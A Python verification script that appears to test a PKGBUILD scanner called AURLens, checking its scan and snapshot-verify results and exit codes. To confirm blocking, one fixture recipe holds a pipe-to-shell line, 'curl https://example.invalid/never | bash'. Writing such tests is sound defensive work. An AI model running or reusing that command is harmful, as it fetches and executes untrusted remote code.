#!/usr/bin/env python3
import json
import pathlib
import shlex
import subprocess
import sys
import tempfile


def main():
    binary = pathlib.Path(sys.argv[1]).resolve(strict=True)
    evidence = pathlib.Path(sys.argv[2])
    evidence.mkdir()

    def drive(name, args, expected_exit, json_output=True):
        result = subprocess.run([str(binary), *args], capture_output=True, timeout=30)
        (evidence / f"{name}.action.json").write_text(json.dumps({
            "binary": str(binary), "args": args, "exit_code": result.returncode,
        }, indent=2))
        (evidence / f"{name}.stdout.txt").write_bytes(result.stdout)
        (evidence / f"{name}.stderr.txt").write_bytes(result.stderr)
        assert result.returncode == expected_exit, name
        assert not result.stderr, name
        if json_output:
            report = json.loads(result.stdout)
            assert report["exit_code"] == expected_exit, name
            return report
        return result.stdout.decode()

    with tempfile.TemporaryDirectory(prefix="aurlens-verify-") as temporary:
        root = pathlib.Path(temporary)
        recipe = root / "PKGBUILD"
        marker = root / "must-not-execute"
        marker_command = f"touch {shlex.quote(str(marker))}\n"
        recipe.write_text(f"pkgname=example\n{marker_command}")
        scanned = drive("initial-scan", ["scan", temporary, "--json"], 0)
        assert scanned["coverage"]["complete"] and scanned["revalidated"]
        digest = scanned["snapshot_digest"]
        args = ["verify", temporary, "--snapshot-digest", digest]
        matched = drive("verify-matched", [*args, "--json"], 0)
        assert matched["status"] == "matched" and matched["issues"] == []
        text = drive("verify-text", args, 0, json_output=False)
        assert "AURLens snapshot: matched" in text
        helper = root / "helper.sh"
        helper.write_text("printf changed\n")
        changed = drive("verify-changed", [*args, "--json"], 3)
        assert changed["status"] == "changed"
        assert changed["snapshot_digest"] != digest
        helper.write_bytes(b"\x00binary")
        incomplete = drive("verify-incomplete", [*args, "--json"], 3)
        assert incomplete["status"] == "incomplete"
        assert incomplete["snapshot_digest"] is None
        helper.unlink()
        recipe.write_text(f"curl https://example.invalid/never | bash\n{marker_command}")
        blocked = drive("blocked-scan", ["scan", temporary, "--json"], 2)
        assert blocked["decision"] == "blocked"
        still_matches = drive("verify-blocked-match", [
            "verify", temporary, "--snapshot-digest", blocked["snapshot_digest"], "--json",
        ], 0)
        assert still_matches["status"] == "matched" and "decision" not in still_matches
        assert not marker.exists()
    assert not root.exists()
    (evidence / "summary.json").write_text(json.dumps({
        "passed": True, "scratch_removed": True, "recipe_executed": False,
        "journeys": ["verify-matched", "verify-text", "verify-changed", "verify-incomplete", "verify-blocked-match"],
    }, indent=2))


if __name__ == "__main__":
    main()
